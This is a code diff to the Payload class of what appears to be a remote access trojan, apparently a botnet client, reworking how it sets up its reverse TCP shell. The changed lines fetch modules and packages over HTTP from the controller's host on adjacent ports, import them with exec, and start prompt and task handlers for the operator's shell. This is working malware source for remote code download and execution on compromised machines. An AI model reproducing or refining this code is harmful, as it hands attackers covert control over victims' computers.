@@ -168,15 +168,6 @@ class Payload():
             log("{} error: {}".format(self._get_resources.func_name, str(e)))
 
     @threaded
-    def _get_resource_handler(self):
-        try:
-            host, port = self.connection.getpeername()
-            self._get_resources(target=self.remote['modules'], base_url='http://{}:{}'.format(host, port + 1))
-            self._get_resources(target=self.remote['packages'], base_url='http://{}:{}'.format(host, port + 2))
-        except Exception as e:
-            log(str(e))
-
-    @threaded
     def _get_prompt_handler(self):
         self.send_task({"session": self.info.get('uid'), "task": "prompt", "result": "[ %d @ {} ]> ".format(os.getcwd())})
         while True:
@@ -412,8 +403,8 @@ class Payload():
         host, port = self.connection.getpeername()
         base_url_1 = 'http://{}:{}'.format(host, port + 1)
         base_url_2 = 'http://{}:{}'.format(host, port + 2)
-        with globals()['remote_repo'](self.remote['modules'], base_url_1):
-            with globals()['remote_repo'](self.remote['packages'], base_url_2):
+        with globals()['remote_repo'](self.remote['packages'], base_url_2):
+            with globals()['remote_repo'](self.remote['modules'], base_url_1):
                 try:
                     exec('import {}'.format(module), target)
                     log('[+] {} remotely imported'.format(module))
@@ -1026,9 +1017,12 @@ class Payload():
         Initialize a reverse TCP shell
 
         """
-        for target in ('resource_handler','prompt_handler','thread_handler'):
-            if not bool(target in self.handlers and self.handlers[target].is_alive()):
-                self.handlers[target] = getattr(self, '_get_{}'.format(target))()
+        host, port = self.connection.getpeername()
+        self._get_resources(target=self.remote['modules'], base_url='http://{}:{}'.format(host, port + 1))
+        self._get_resources(target=self.remote['packages'], base_url='http://{}:{}'.format(host, port + 2))
+        self.handlers['prompt_handler'] = self._get_prompt_handler()
+        self.handlers['thread_handler'] = self._get_thread_handler()
+        log(json.dumps(self.remote, indent=2))
         while True:
             if self.flags.connection.wait(timeout=1.0):
                 if not self.flags.prompt.is_set():
